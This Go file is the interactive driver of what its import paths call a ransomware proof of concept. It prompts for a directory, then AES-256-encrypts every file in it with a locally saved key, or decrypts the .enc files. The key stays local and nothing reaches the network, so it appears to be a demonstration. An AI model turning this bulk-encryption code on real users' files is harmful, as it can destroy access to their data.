package main

import (
	"fmt"
	"github.com/arviiyer/ransomware-poc/encryption"  // Import the encryption package
	"github.com/arviiyer/ransomware-poc/decryption"  // Import the decryption package
	"strings"
)

// Get the user's choice (Encrypt or Decrypt)
func getUserChoice() string {
	var choice string
	fmt.Print("Would you like to encrypt or decrypt? (e/d): ")
	fmt.Scanln(&choice)
	choice = strings.TrimSpace(strings.ToLower(choice))
	return choice
}

// Get directory path from the user
func getUserInput() string {
	var dirPath string
	fmt.Print("Enter directory path: ")
	fmt.Scanln(&dirPath)
	fmt.Println("Entered directory path: ", dirPath)
	return dirPath
}

func main() {
	// Ask the user if they want to encrypt or decrypt
	choice := getUserChoice()

	// Get the directory from the user
	dirPath := getUserInput()

	// Perform the requested action (encrypt or decrypt)
	switch choice {
	case "e":
		// Generate a random AES-256 encryption key and save it to a file
		key, err := encryption.GenerateAndSaveAESKey()
		if err != nil {
			fmt.Println("Error generating and saving AES key:", err)
			return
		}

		// Encrypt all files in the directory using the generated key
		err = encryption.EncryptFilesInDirectory(dirPath, key)
		if err != nil {
			fmt.Println("Error encrypting files in the directory:", err)
		} else {
			fmt.Println("All files in the directory were encrypted successfully!")
		}

	case "d":
		// Load the saved AES key from the key directory
		key, err := decryption.LoadAESKey()
		if err != nil {
			fmt.Println("Error loading AES key:", err)
			return
		}

		// Decrypt all .enc files in the directory using the loaded key
		err = decryption.DecryptFilesInDirectory(dirPath, key)
		if err != nil {
			fmt.Println("Error decrypting files in the directory:", err)
		} else {
			fmt.Println("All .enc files in the directory were decrypted successfully!")
		}

	default:
		fmt.Println("Invalid choice. Please enter 'e' for encryption or 'd' for decryption.")
	}
}

